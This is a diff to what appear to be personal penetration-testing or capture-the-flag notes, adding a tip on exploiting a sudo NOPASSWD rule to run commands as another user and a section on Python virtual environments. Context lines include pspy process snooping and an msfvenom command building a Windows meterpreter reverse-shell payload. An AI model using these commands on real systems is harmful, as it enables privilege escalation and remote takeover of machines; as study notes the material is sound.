@@ -132,6 +132,8 @@ Also, when calling .php files try both with and without the extension in web bro
 ```bash
 sudo -l 
 #shows any commands to be run as sudo by user
+#(scriptmanager : scriptmanager) NOPASSWD: ALL means you can execute any commands as scriptmanager
+sudo -u scriptmanager <command>
 
 chmod +x pspy && ./pspy 
 #sees all commands run, can find cron run as sudo etc
@@ -182,5 +184,24 @@ Unstaged means special meterpreter shell. OS/meterpreter_reverse_tcp is unstaged
 ```bash
 msfvenom -p windows/x64/meterpreter/reverse_tcp LHOST=ip LPORT=port -f <format> -o outfile.exe
 #payload creation made easy :)
+
+```
+
+## Python
+
+venv is useful for running python scripts which may have outdated dependancies
+
+```bash
+python3 -m venv <environment name>
+source <environment name>/bin/activate
+
+pip list 
+#should only show 2 libraries, used to confirm
+
+pip install -r requirements.txt
+#install requirements in venv
+
+deactivate
+#exits venv
 
 ```
